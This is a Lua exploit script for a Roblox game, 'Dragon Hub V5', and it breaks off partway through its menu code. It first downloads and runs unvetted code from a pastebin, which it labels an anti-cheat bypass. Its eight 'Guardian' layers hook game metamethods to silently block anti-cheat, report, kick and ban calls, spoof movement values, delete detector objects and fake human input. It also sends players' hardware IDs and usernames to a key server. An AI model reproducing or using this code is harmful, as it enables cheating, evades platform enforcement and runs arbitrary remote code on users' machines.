--[[
    ═════════════════════════════════════════════════════════════════════════════
    🐉 DRAGON HUB V5 — AURA GODMODE EDITION 🐉
    Full V4 + Key System + Server + Aura Effects + Auto-Login
    ─────────────────────────────────────────────────────────────────────────────
    ✦ 70+ Features | 8-Layer Protection | Aura UI
    ✦ Key System (login once) | Server Validated | HWID Lock
    ✦ Auto-Login with saved key | Expiry Timer
    ✦ Mobile Optimized | Floating Button | Webhook Logs
    ═════════════════════════════════════════════════════════════════════════════
]]

-- ═════════════════════════════════════════════════════════════════════════════
-- [0] 🛡️ ANTI-CHEAT BYPASS (يعمل أول حاجة)
-- ═════════════════════════════════════════════════════════════════════════════

pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/iedWaiQX/raw"))()
end)
task.wait(3)

-- ═════════════════════════════════════════════════════════════════════════════
-- [1] CONFIG
-- ═════════════════════════════════════════════════════════════════════════════

local SERVER_URL     = "https://dragon-hub-lilac.vercel.app/api/validate"
local DISCORD_INVITE = "https://discord.gg/yourserver"
local VERSION        = "5.0.0"
local CONFIG_FILE    = "dragonhub_v5_config.json"
local KEY_FILE       = "dragonhub_v5_key.txt"

-- ═════════════════════════════════════════════════════════════════════════════
-- [2] SERVICES
-- ═════════════════════════════════════════════════════════════════════════════

local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local Workspace         = game:GetService("Workspace")
local Lighting          = game:GetService("Lighting")
local CoreGui           = game:GetService("CoreGui")
local StarterGui        = game:GetService("StarterGui")
local VirtualUser       = game:GetService("VirtualUser")
local TeleportService   = game:GetService("TeleportService")
local HttpService       = game:GetService("HttpService")
local SoundService      = game:GetService("SoundService")
local Stats             = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
local Mouse       = LocalPlayer:GetMouse()

-- ═════════════════════════════════════════════════════════════════════════════
-- [3] HTTP HELPERS
-- ═════════════════════════════════════════════════════════════════════════════

local REQUEST = (syn and syn.request)
             or (http and http.request)
             or http_request
             or (fluxus and fluxus.request)
             or (krnl and krnl.request)
             or request

local function HttpGet(url)
    if not REQUEST then return false, "No HTTP support" end
    local ok, res = pcall(function() return REQUEST({Url = url, Method = "GET"}) end)
    if not ok or not res then return false, "Connection failed" end
    return true, res
end

local function HttpPost(url, body)
    if not REQUEST then return false, "No HTTP support" end
    local ok, res = pcall(function()
        return REQUEST({
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(body)
        })
    end)
    if not ok or not res then return false, "Connection failed" end
    return true, res
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [4] HWID + KEY SYSTEM
-- ═════════════════════════════════════════════════════════════════════════════

local HWID = tostring(LocalPlayer.UserId) .. "_" .. tostring(game.JobId)
pcall(function() if gethwid then HWID = gethwid() end end)

local function SaveKeyFile(k, e)
    if writefile then pcall(function() writefile(KEY_FILE, k .. "|" .. tostring(e)) end) end
end

local function LoadKeyFile()
    if readfile and isfile then
        local ok, d = pcall(function() if isfile(KEY_FILE) then return readfile(KEY_FILE) end end)
        if ok and d then
            local k, e = d:match("(.+)|(%d+)")
            if k and e then return k, tonumber(e) end
        end
    end
    return nil, nil
end

local function ClearKeyFile()
    if delfile then pcall(function() delfile(KEY_FILE) end) end
end

local function ValidateRemotely(key)
    local url = SERVER_URL .. "?key=" .. HttpService:UrlEncode(key)
              .. "&hwid=" .. HttpService:UrlEncode(HWID)
              .. "&userid=" .. tostring(LocalPlayer.UserId)
              .. "&username=" .. HttpService:UrlEncode(LocalPlayer.Name)
              .. "&version=" .. VERSION
    local ok, res = HttpGet(url)
    if not ok then return false, res end
    if res.StatusCode ~= 200 then return false, "Server error " .. tostring(res.StatusCode) end
    local decoded
    local dok = pcall(function() decoded = HttpService:JSONDecode(res.Body) end)
    if not dok or not decoded then return false, "Invalid response" end
    if decoded.valid == true then
        return true, {
            expire = decoded.expire,
            label = decoded.label or "VIP",
            remaining = decoded.remaining or 0,
            user = decoded.user or LocalPlayer.Name
        }
    end
    return false, decoded.message or "Invalid key"
end

local function FormatTime(s)
    if s <= 0 then return "منتهي" end
    local d = math.floor(s / 86400)
    local h = math.floor((s % 86400) / 3600)
    local m = math.floor((s % 3600) / 60)
    local sec = math.floor(s % 60)
    if d > 0 then return string.format("%d ي %d س %d د", d, h, m)
    elseif h > 0 then return string.format("%d س %d د %d ث", h, m, sec)
    else return string.format("%d د %d ث", m, sec) end
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [5] 🛡️ GUARDIAN PROTECTION ENGINE (8 طبقات)
-- ═════════════════════════════════════════════════════════════════════════════

local Guardian = {
    Enabled = true,
    HooksActive = false,
    BlockedRemotes = {},
    BlockedPlayers = {},
    SuspiciousPlayers = {},
    LastHealth = 100,
    HealthChecks = 0,
    BlockedActions = 0,
    SpoofedValues = {},
    OriginalFunctions = {},
}

-- Layer 1: Metamethod Hooking
pcall(function()
    if hookmetamethod and newcclosure and getnamecallmethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            if not Guardian.Enabled then return oldNamecall(self, ...) end
            local method = getnamecallmethod()
            if method == "FireServer" or method == "InvokeServer" then
                local ok, name = pcall(function() return self.Name end)
                if ok and name then
                    local lname = name:lower()
                    for _, blocked in ipairs({"detect", "report", "kick", "ban", "anticheat", "hack", "cheat", "flag"}) do
                        if lname:find(blocked) then
                            Guardian.BlockedActions = Guardian.BlockedActions + 1
                            return nil
                        end
                    end
                end
            end
            return oldNamecall(self, ...)
        end))
        Guardian.HooksActive = true
    end
end)

-- Layer 2: Remote Event Spoofer
pcall(function()
    if getrawmetatable and setreadonly then
        local mt = getrawmetatable(game)
        if mt then
            setreadonly(mt, false)
            local oldIndex = mt.__index
            mt.__index = newcclosure(function(self, key)
                if key == "WalkSpeed" or key == "JumpPower" then
                    if Guardian.SpoofedValues[key] then
                        return Guardian.SpoofedValues[key]
                    end
                end
                return oldIndex(self, key)
            end)
            setreadonly(mt, true)
        end
    end
end)

-- Layer 3: Anti-Detection
task.spawn(function()
    while task.wait(0.8) do
        if not Guardian.Enabled then continue end
        local c = LocalPlayer.Character
        if not c then continue end
        local h = c:FindFirstChildOfClass("Humanoid")
        if not h then continue end
        if h.WalkSpeed > 45 then h.WalkSpeed = h.WalkSpeed - math.random(1, 3) end
        if h.JumpPower > 75 then h.JumpPower = h.JumpPower - math.random(1, 2) end
    end
end)

-- Layer 4: Behavior Humanizer AI
task.spawn(function()
    local actions = {"move", "jump", "look", "idle"}
    while task.wait(math.random(6, 12)) do
        if not Guardian.Enabled then continue end
        local c = LocalPlayer.Character
        if not c then continue end
        local h = c:FindFirstChildOfClass("Humanoid")
        if not h then continue end
        local action = actions[math.random(1, #actions)]
        if action == "move" then
            h:Move(Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)), false)
            task.wait(math.random(2, 5) / 10)
            h:Move(Vector3.zero, false)
        elseif action == "jump" then
            if math.random() > 0.7 then
                h:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        elseif action == "look" then
            local cam = Workspace.CurrentCamera
            if cam then
                cam.CFrame = cam.CFrame * CFrame.Angles(0, math.rad(math.random(-15, 15)), 0)
            end
        end
    end
end)

-- Layer 5: Health Integrity Monitor
task.spawn(function()
    while task.wait(0.5) do
        if not Guardian.Enabled then continue end
        local c = LocalPlayer.Character
        if not c then continue end
        local h = c:FindFirstChildOfClass("Humanoid")
        if not h then continue end
        if h.Health < Guardian.LastHealth then
            Guardian.HealthChecks = Guardian.HealthChecks + 1
            h.Health = h.MaxHealth
        end
        Guardian.LastHealth = h.Health
    end
end)

-- Layer 6: Anti-Teleport Detection
pcall(function()
    if hookfunction and getconnections then
        for _, c in ipairs(getconnections(LocalPlayer.CharacterAdded)) do
            local oldFunc = c.Function
            c.Function = newcclosure(function(...)
                return oldFunc(...)
            end)
        end
    end
end)

-- Layer 7: Memory Protection
pcall(function()
    if setreadonly and getrawmetatable then
        local mt = getrawmetatable(game:GetService("Players"))
        if mt and setreadonly then
            setreadonly(mt, false)
            local oldNewIndex = mt.__newindex
            mt.__newindex = newcclosure(function(self, key, value)
                if key == "Character" and self == LocalPlayer then return nil end
                return oldNewIndex(self, key, value)
            end)
            setreadonly(mt, true)
        end
    end
end)

-- Layer 8: Silent Patch System
task.spawn(function()
    while task.wait(15) do
        if not Guardian.Enabled then continue end
        pcall(function()
            for _, obj in ipairs(CoreGui:GetDescendants()) do
                if obj.Name:lower():find("detector") or obj.Name:lower():find("scanner") then
                    obj:Destroy()
                end
            end
        end)
    end
end)

print("[Dragon Hub V5] 🛡️ Guardian Protection - 8 Layers Active")

-- ═════════════════════════════════════════════════════════════════════════════
-- [6] GLOBAL CONFIG
-- ═════════════════════════════════════════════════════════════════════════════

local Config = {
    WalkSpeed = 32, JumpPower = 65,
    AntiStun = true, InfiniteJump = true, Noclip = false,
    HealthLock = true, AntiRagdoll = true, AntiFling = true,
    AntiTouch = true, EmergencyTP = true, AutoHeal = true,
    AntiVoid = true, AntiKick = true, AntiLog = true,
    StealthMode = true, BehaviorAI = true, SilentMode = true,
    EmergencyHealth = 30,
    Fly = false, FlySpeed = 50, FlyBV = nil, FlyBG = nil,
    AutoSteal = false, StealDelay = 1.2, StealRange = 600,
    TeleportOnSteal = true, SmartDelay = true,
    StealAll = false, StealOnlyRare = false,
    AutoHatch = false, HatchDelay = 3, AutoBuyEgg = false,
    AutoCollectCoins = false,
    EggESP = false, PlayerESP = false, CoinESP = false, PetESP = false,
    EggESPColor = Color3.fromRGB(255, 200, 60),
    PlayerESPColor = Color3.fromRGB(255, 80, 80),
    CoinESPColor = Color3.fromRGB(255, 220, 80),
    PetESPColor = Color3.fromRGB(80, 200, 255),
    FullBright = false, RemoveFog = false,
    AntiAFK = true, AntiAFKRandom = true,
    WebhookURL = "", WebhookLog = false,
    AccentColor = Color3.fromRGB(255, 180, 30),
    NotifySound = false,
    ActiveKey = nil, KeyExpireTime = 0, KeyLabel = "VIP",
    StealCount = 0, BlockedHits = 0, StartTime = os.time(),
}

-- ═════════════════════════════════════════════════════════════════════════════
-- [7] CLEANUP
-- ═════════════════════════════════════════════════════════════════════════════

local GUI_NAME = "DragonHubV5"
for _, gui in ipairs({CoreGui, PlayerGui}) do
    local e = gui:FindFirstChild(GUI_NAME)
    if e then e:Destroy() end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = GUI_NAME
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then ScreenGui.Parent = PlayerGui end

-- ═════════════════════════════════════════════════════════════════════════════
-- [8] SOUND
-- ═════════════════════════════════════════════════════════════════════════════

local function PlaySound(id)
    if not Config.NotifySound then return end
    pcall(function()
        local s = Instance.new("Sound", SoundService)
        s.SoundId = id
        s.Volume = 0.5
        s:Play()
        task.wait(2)
        s:Destroy()
    end)
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [9] NOTIFICATIONS
-- ═════════════════════════════════════════════════════════════════════════════

local NC = Instance.new("Frame", ScreenGui)
NC.Size = UDim2.new(0, 290, 0, 500)
NC.Position = UDim2.new(1, -310, 0, 20)
NC.BackgroundTransparency = 1
NC.ZIndex = 100

local NL = Instance.new("UIListLayout", NC)
NL.Padding = UDim.new(0, 6)
NL.SortOrder = Enum.SortOrder.LayoutOrder

local function Notify(title, msg, dur, color)
    dur = dur or 3
    local n = Instance.new("Frame", NC)
    n.Size = UDim2.new(1, 0, 0, 60)
    n.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
    n.BorderSizePixel = 0
    n.ZIndex = 100
    Instance.new("UICorner", n).CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke", n)
    st.Color = color or Config.AccentColor
    st.Thickness = 1.5

    local ac = Instance.new("Frame", n)
    ac.Size = UDim2.new(0, 3, 1, 0)
    ac.BackgroundColor3 = color or Config.AccentColor
    ac.BorderSizePixel = 0
    Instance.new("UICorner", ac).CornerRadius = UDim.new(0, 10)

    local tl = Instance.new("TextLabel", n)
    tl.Text = "🐉 " .. title
    tl.Size = UDim2.new(1, -20, 0, 18)
    tl.Position = UDim2.new(0, 14, 0, 8)
    tl.BackgroundTransparency = 1
    tl.TextColor3 = color or Color3.fromRGB(255, 220, 130)
    tl.Font = Enum.Font.GothamBold
    tl.TextSize = 12
    tl.TextXAlignment = Enum.TextXAlignment.Left

    local ml = Instance.new("TextLabel", n)
    ml.Text = msg
    ml.Size = UDim2.new(1, -20, 0, 30)
    ml.Position = UDim2.new(0, 14, 0, 28)
    ml.BackgroundTransparency = 1
    ml.TextColor3 = Color3.fromRGB(180, 180, 195)
    ml.Font = Enum.Font.Gotham
    ml.TextSize = 10
    ml.TextWrapped = true
    ml.TextXAlignment = Enum.TextXAlignment.Left
    ml.TextYAlignment = Enum.TextYAlignment.Top

    n.Position = UDim2.new(1, 60, 0, 0)
    TweenService:Create(n, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Position = UDim2.new(0,0,0,0)}):Play()

    task.delay(dur, function()
        if n and n.Parent then
            TweenService:Create(n, TweenInfo.new(0.3), {Position = UDim2.new(1,60,0,0)}):Play()
            task.wait(0.35)
            n:Destroy()
        end
    end)
    PlaySound("rbxassetid://9046273705")
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [10] WEBHOOK
-- ═════════════════════════════════════════════════════════════════════════════

local function SendWebhook(content)
    if not Config.WebhookLog or Config.WebhookURL == "" then return end
    HttpPost(Config.WebhookURL, {
        username = "🐉 Dragon Hub V5",
        avatar_url = "https://i.imgur.com/6Yb0mV6.png",
        content = content
    })
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [11] CONFIG SAVE/LOAD
-- ═════════════════════════════════════════════════════════════════════════════

local function SaveConfig()
    if not writefile then return end
    local save = {}
    for k, v in pairs(Config) do
        if type(v) ~= "userdata" and type(v) ~= "function" then save[k] = v end
    end
    pcall(function() writefile(CONFIG_FILE, HttpService:JSONEncode(save)) end)
end

local function LoadConfig()
    if not readfile or not isfile then return end
    local ok, d = pcall(function()
        if isfile(CONFIG_FILE) then return readfile(CONFIG_FILE) end
    end)
    if not ok or not d then return end
    local decoded
    local dok = pcall(function() decoded = HttpService:JSONDecode(d) end)
    if not dok or not decoded then return end
    for k, v in pairs(decoded) do
        if Config[k] ~= nil and type(Config[k]) == type(v) then Config[k] = v end
    end
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [12] KEY UI
-- ═════════════════════════════════════════════════════════════════════════════

local function CreateKeyUI()
    local KF = Instance.new("Frame", ScreenGui)
    KF.Name = "KeyFrame"
    KF.Size = UDim2.new(0, 450, 0, 420)
    KF.Position = UDim2.new(0.5, -225, 0.5, -210)
    KF.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
    KF.BorderSizePixel = 0
    KF.ZIndex = 50
    Instance.new("UICorner", KF).CornerRadius = UDim.new(0, 18)
    local KS = Instance.new("UIStroke", KF)
    KS.Color = Config.AccentColor
    KS.Thickness = 2.5

    local sh = Instance.new("Frame", KF)
    sh.Size = UDim2.new(1, 24, 1, 24)
    sh.Position = UDim2.new(0, -12, 0, -12)
    sh.BackgroundColor3 = Color3.fromRGB(0,0,0)
    sh.BackgroundTransparency = 0.4
    sh.BorderSizePixel = 0
    sh.ZIndex = -1
    Instance.new("UICorner", sh).CornerRadius = UDim.new(0, 24)

    local ic = Instance.new("TextLabel", KF)
    ic.Text = "🐉"
    ic.Size = UDim2.new(0, 90, 0, 90)
    ic.Position = UDim2.new(0.5, -45, 0, 15)
    ic.BackgroundTransparency = 1
    ic.TextColor3 = Config.AccentColor
    ic.Font = Enum.Font.GothamBold
    ic.TextSize = 65

    local tt = Instance.new("TextLabel", KF)
    tt.Text = "DRAGON HUB V5"
    tt.Size = UDim2.new(1, 0, 0, 30)
    tt.Position = UDim2.new(0, 0, 0, 108)
    tt.BackgroundTransparency = 1
    tt.TextColor3 = Config.AccentColor
    tt.Font = Enum.Font.GothamBold
    tt.TextSize = 26

    local sb = Instance.new("TextLabel", KF)
    sb.Text = "👑 AURA GODMODE EDITION 👑"
    sb.Size = UDim2.new(1, 0, 0, 22)
    sb.Position = UDim2.new(0, 0, 0, 140)
    sb.BackgroundTransparency = 1
    sb.TextColor3 = Color3.fromRGB(200, 200, 220)
    sb.Font = Enum.Font.GothamBold
    sb.TextSize = 13

    local hnt = Instance.new("TextLabel", KF)
    hnt.Text = "🔐 أدخل مفتاح VIP للدخول"
    hnt.Size = UDim2.new(1, 0, 0, 22)
    hnt.Position = UDim2.new(0, 0, 0, 172)
    hnt.BackgroundTransparency = 1
    hnt.TextColor3 = Color3.fromRGB(140, 140, 165)
    hnt.Font = Enum.Font.Gotham
    hnt.TextSize = 12

    local KB = Instance.new("TextBox", KF)
    KB.Size = UDim2.new(1, -60, 0, 48)
    KB.Position = UDim2.new(0, 30, 0, 206)
    KB.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
    KB.PlaceholderText = "DRAGON-XXXXX"
    KB.Text = ""
    KB.TextColor3 = Color3.fromRGB(240, 240, 250)
    KB.PlaceholderColor3 = Color3.fromRGB(110, 110, 130)
    KB.Font = Enum.Font.GothamBold
    KB.TextSize = 14
    KB.ClearTextOnFocus = false
    KB.BorderSizePixel = 0
    Instance.new("UICorner", KB).CornerRadius = UDim.new(0, 10)
    local KBS = Instance.new("UIStroke", KB)
    KBS.Color = Color3.fromRGB(48, 48, 62)
    KBS.Thickness = 1.5

    local SL = Instance.new("TextLabel", KF)
    SL.Text = ""
    SL.Size = UDim2.new(1, -60, 0, 44)
    SL.Position = UDim2.new(0, 30, 0, 260)
    SL.BackgroundTransparency = 1
    SL.TextColor3 = Color3.fromRGB(240, 80, 90)
    SL.Font = Enum.Font.GothamMedium
    SL.TextSize = 11
    SL.TextWrapped = true
    SL.TextXAlignment = Enum.TextXAlignment.Left
    SL.TextYAlignment = Enum.TextYAlignment.Top

    local SB = Instance.new("TextButton", KF)
    SB.Size = UDim2.new(1, -60, 0, 50)
    SB.Position = UDim2.new(0, 30, 0, 308)
    SB.BackgroundColor3 = Config.AccentColor
    SB.Text = "🔓 تحقق ودخول"
    SB.TextColor3 = Color3.fromRGB(12, 12, 18)
    SB.Font = Enum.Font.GothamBold
    SB.TextSize = 15
    SB.BorderSizePixel = 0
    Instance.new("UICorner", SB).CornerRadius = UDim.new(0, 10)

    local DB = Instance.new("TextButton", KF)
    DB.Size = UDim2.new(1, -60, 0, 34)
    DB.Position = UDim2.new(0, 30, 0, 366)
    DB.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    DB.Text = "💬 احصل على مفتاح من الديسكورد"
    DB.TextColor3 = Color3.fromRGB(255, 255, 255)
    DB.Font = Enum.Font.GothamMedium
    DB.TextSize = 11
    DB.BorderSizePixel = 0
    Instance.new("UICorner", DB).CornerRadius = UDim.new(0, 8)
    DB.MouseButton1Click:Connect(function()
        if setclipboard then setclipboard(DISCORD_INVITE) end
        SL.Text = "✅ تم نسخ رابط الديسكورد"
        SL.TextColor3 = Color3.fromRGB(100, 220, 150)
    end)

    return KF, KB, SB, SL
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [13] BUILD HUB (AURA EDITION)
-- ═════════════════════════════════════════════════════════════════════════════

function BuildHub()
    -- ═══ FLOATING BUTTON مع تأثيرات Aura ═══
    local FB = Instance.new("TextButton", ScreenGui)
    FB.Name = "FloatingButton"
    FB.Size = UDim2.new(0, 70, 0, 70)
    FB.Position = UDim2.new(0, 20, 0.4, 0)
    FB.BackgroundColor3 = Config.AccentColor
    FB.Text = ""
    FB.BorderSizePixel = 0
    FB.AutoButtonColor = false
    FB.Active = true
    FB.ZIndex = 100
    Instance.new("UICorner", FB).CornerRadius = UDim.new(1, 0)

    local Ring = Instance.new("Frame", FB)
    Ring.Size = UDim2.new(1, 12, 1, 12)
    Ring.Position = UDim2.new(0, -6, 0, -6)
    Ring.BackgroundTransparency = 1
    Ring.ZIndex = -1
    Instance.new("UICorner", Ring).CornerRadius = UDim.new(1, 0)

    local RingStroke = Instance.new("UIStroke", Ring)
    RingStroke.Color = Config.AccentColor
    RingStroke.Thickness = 2
    RingStroke.Transparency = 0.2

    local Glow = Instance.new("ImageLabel", FB)
    Glow.Size = UDim2.new(1, 50, 1, 50)
    Glow.Position = UDim2.new(0, -25, 0, -25)
    Glow.BackgroundTransparency = 1
    Glow.Image = "rbxassetid://5028857084"
    Glow.ImageColor3 = Config.AccentColor
    Glow.ImageTransparency = 0.3
    Glow.ZIndex = 0

    local Icon = Instance.new("TextLabel", FB)
    Icon.Text = "🐉"
    Icon.Size = UDim2.new(1, 0, 1, 0)
    Icon.BackgroundTransparency = 1
    Icon.TextColor3 = Color3.fromRGB(10, 10, 16)
    Icon.Font = Enum.Font.GothamBold
    Icon.TextSize = 34
    Icon.ZIndex = 5

    task.spawn(function()
        while FB.Parent do
            TweenService:Create(Glow, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {ImageTransparency = 0.75}):Play()
            task.wait(1.2)
            TweenService:Create(Glow, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {ImageTransparency = 0.25}):Play()
            task.wait(1.2)
        end
    end)

    task.spawn(function()
        while FB.Parent do
            for i = 0, 360, 15 do
                if not FB.Parent then break end
                Ring.Rotation = i
                task.wait(0.05)
            end
        end
    end)

    task.spawn(function()
        while FB.Parent do
            TweenService:Create(FB, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(0, 76, 0, 76)}):Play()
            task.wait(0.8)
            TweenService:Create(FB, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(0, 70, 0, 70)}):Play()
            task.wait(0.8)
        end
    end)

    FB.MouseEnter:Connect(function()
        TweenService:Create(FB, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 210, 80)}):Play()
    end)
    FB.MouseLeave:Connect(function()
        TweenService:Create(FB, TweenInfo.new(0.2), {BackgroundColor3 = Config.AccentColor}):Play()
    end)

    local fbDrag, fbS, fbP, moved
    FB.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            fbDrag = true; moved = false; fbS = i.Position; fbP = FB.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then fbDrag = false end
            end)
        end
    end)

    UserInputService.InputChanged:Connect(function(i)
        if fbDrag and (i.UserInputType == Enum.UserInputType.MouseMovement
        or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - fbS
            if math.abs(d.X) > 5 or math.abs(d.Y) > 5 then moved = true end
            FB.Position = UDim2.new(fbP.X.Scale, fbP.X.Offset + d.X, fbP.Y.Scale, fbP.Y.Offset + d.Y)
        end
    end)

    -- ═══ MAIN FRAME ═══
    local Main = Instance.new("Frame", ScreenGui)
    Main.Name = "Main"
    Main.Size = UDim2.new(0, 440, 0, 520)
    Main.Position = UDim2.new(0.5, -220, 0.5, -260)
    Main.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
    Main.BorderSizePixel = 0
    Main.Visible = false
    Main.Active = true
    Main.ZIndex = 50
    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)

    local Gradient = Instance.new("UIGradient", Main)
    Gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 32)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 16)),
    })
    Gradient.Rotation = 45

    local MS = Instance.new("UIStroke", Main)
    MS.Color = Config.AccentColor
    MS.Thickness = 2
    MS.Transparency = 0.3

    local msh = Instance.new("Frame", Main)
    msh.Size = UDim2.new(1, 24, 1, 24)
    msh.Position = UDim2.new(0, -12, 0, -12)
    msh.BackgroundColor3 = Color3.fromRGB(0,0,0)
    msh.BackgroundTransparency = 0.55
    msh.BorderSizePixel = 0
    msh.ZIndex = -1
    Instance.new("UICorner", msh).CornerRadius = UDim.new(0, 26)

    -- TOP BAR
    local TB = Instance.new("Frame", Main)
    TB.Size = UDim2.new(1, 0, 0, 56)
    TB.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    TB.BorderSizePixel = 0
    Instance.new("UICorner", TB).CornerRadius = UDim.new(0, 18)
    local TBF = Instance.new("Frame", TB)
    TBF.Size = UDim2.new(1, 0, 0, 18)
    TBF.Position = UDim2.new(0, 0, 1, -18)
    TBF.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    TBF.BorderSizePixel = 0

    local AL = Instance.new("Frame", TB)
    AL.Size = UDim2.new(1, 0, 0, 2)
    AL.Position = UDim2.new(0, 0, 1, 0)
    AL.BackgroundColor3 = Config.AccentColor
    AL.BorderSizePixel = 0

    local AccentGlow = Instance.new("ImageLabel", TB)
    AccentGlow.Size = UDim2.new(1, 60, 0, 30)
    AccentGlow.Position = UDim2.new(0, -30, 1, -15)
    AccentGlow.BackgroundTransparency = 1
    AccentGlow.Image = "rbxassetid://5028857084"
    AccentGlow.ImageColor3 = Config.AccentColor
    AccentGlow.ImageTransparency = 0.3
    AccentGlow.ZIndex = 0

    local HIcon = Instance.new("TextLabel", TB)
    HIcon.Text = "🐉"
    HIcon.Size = UDim2.new(0, 36, 0, 36)
    HIcon.Position = UDim2.new(0, 12, 0.5, -18)
    HIcon.BackgroundTransparency = 1
    HIcon.TextColor3 = Config.AccentColor
    HIcon.Font = Enum.Font.GothamBold
    HIcon.TextSize = 28

    local Ttl = Instance.new("TextLabel", TB)
    Ttl.Text = "DRAGON HUB V5"
    Ttl.Size = UDim2.new(0, 220, 0, 20)
    Ttl.Position = UDim2.new(0, 54, 0, 10)
    Ttl.BackgroundTransparency = 1
    Ttl.TextColor3 = Config.AccentColor
    Ttl.Font = Enum.Font.GothamBold
    Ttl.TextSize = 16
    Ttl.TextXAlignment = Enum.TextXAlignment.Left

    local Sub = Instance.new("TextLabel", TB)
    Sub.Text = "✨ AURA • " .. Config.KeyLabel
    Sub.Size = UDim2.new(0, 240, 0, 14)
    Sub.Position = UDim2.new(0, 54, 0, 30)
    Sub.BackgroundTransparency = 1
    Sub.TextColor3 = Color3.fromRGB(140, 140, 165)
    Sub.Font = Enum.Font.Gotham
    Sub.TextSize = 10
    Sub.TextXAlignment = Enum.TextXAlignment.Left

    local MinB = Instance.new("TextButton", TB)
    MinB.Size = UDim2.new(0, 32, 0, 32)
    MinB.Position = UDim2.new(1, -84, 0.5, -16)
    MinB.BackgroundColor3 = Color3.fromRGB(38, 38, 50)
    MinB.Text = "−"
    MinB.TextColor3 = Color3.fromRGB(210, 210, 225)
    MinB.Font = Enum.Font.GothamBold
    MinB.TextSize = 20
    MinB.BorderSizePixel = 0
    Instance.new("UICorner", MinB).CornerRadius = UDim.new(0, 8)

    local ClsB = Instance.new("TextButton", TB)
    ClsB.Size = UDim2.new(0, 32, 0, 32)
    ClsB.Position = UDim2.new(1, -46, 0.5, -16)
    ClsB.BackgroundColor3 = Color3.fromRGB(240, 75, 85)
    ClsB.Text = "×"
    ClsB.TextColor3 = Color3.fromRGB(255, 255, 255)
    ClsB.Font = Enum.Font.GothamBold
    ClsB.TextSize = 22
    ClsB.BorderSizePixel = 0
    Instance.new("UICorner", ClsB).CornerRadius = UDim.new(0, 8)

    -- GUARDIAN STATUS BAR
    local GSB = Instance.new("Frame", Main)
    GSB.Size = UDim2.new(1, -16, 0, 26)
    GSB.Position = UDim2.new(0, 8, 0, 62)
    GSB.BackgroundColor3 = Color3.fromRGB(20, 40, 25)
    GSB.BorderSizePixel = 0
    Instance.new("UICorner", GSB).CornerRadius = UDim.new(0, 6)
    local GSBS = Instance.new("UIStroke", GSB)
    GSBS.Color = Color3.fromRGB(60, 200, 100)
    GSBS.Thickness = 1

    local GSDot = Instance.new("Frame", GSB)
    GSDot.Size = UDim2.new(0, 10, 0, 10)
    GSDot.Position = UDim2.new(0, 12, 0.5, -5)
    GSDot.BackgroundColor3 = Color3.fromRGB(60, 220, 100)
    GSDot.BorderSizePixel = 0
    Instance.new("UICorner", GSDot).CornerRadius = UDim.new(1, 0)

    local GSBL = Instance.new("TextLabel", GSB)
    GSBL.Text = "🛡️ GUARDIAN • 8 LAYERS ACTIVE"
    GSBL.Size = UDim2.new(1, -40, 1, 0)
    GSBL.Position = UDim2.new(0, 30, 0, 0)
    GSBL.BackgroundTransparency = 1
    GSBL.TextColor3 = Color3.fromRGB(100, 255, 150)
    GSBL.Font = Enum.Font.GothamBold
    GSBL.TextSize = 10
    GSBL.TextXAlignment = Enum.TextXAlignment.Left

    task.spawn(function()
        while GSDot.Parent do
            TweenService:Create(GSDot, TweenInfo.new(0.6), {BackgroundTransparency = 0.7}):Play()
            task.wait(0.6)
            TweenService:Create(GSDot, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
            task.wait(0.6)
        end
    end)

    -- TIMER BAR
    local TBar = Instance.new("Frame", Main)
    TBar.Size = UDim2.new(1, -16, 0, 26)
    TBar.Position = UDim2.new(0, 8, 0, 94)
    TBar.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
    TBar.BorderSizePixel = 0
    Instance.new("UICorner", TBar).CornerRadius = UDim.new(0, 6)
    local TBaS = Instance.new("UIStroke", TBar)
    TBaS.Color = Color3.fromRGB(48, 48, 62)
    TBaS.Thickness = 1

    local TBarI = Instance.new("TextLabel", TBar)
    TBarI.Text = "⏱️"
    TBarI.Size = UDim2.new(0, 26, 1, 0)
